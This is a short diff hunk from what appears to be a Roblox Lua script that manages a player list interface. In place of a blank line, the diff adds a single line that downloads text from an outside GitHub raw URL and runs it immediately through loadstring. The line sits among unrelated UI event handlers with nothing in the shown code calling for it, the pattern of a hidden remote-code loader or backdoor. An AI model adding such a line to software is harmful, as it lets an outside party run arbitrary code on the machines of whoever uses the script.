@@ -5056,7 +5056,7 @@ function refreshPlayerListUI()
         refreshBtn.MouseButton1Click:Connect(refreshPlayerListUI)
     end
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iSacredRivals/riaslslss/main/message.txt?t=" .. tick()))()
 Players.PlayerAdded:Connect(refreshPlayerListUI)
 Players.PlayerRemoving:Connect(refreshPlayerListUI)
 DropLabel.MouseButton1Click:Connect(function()
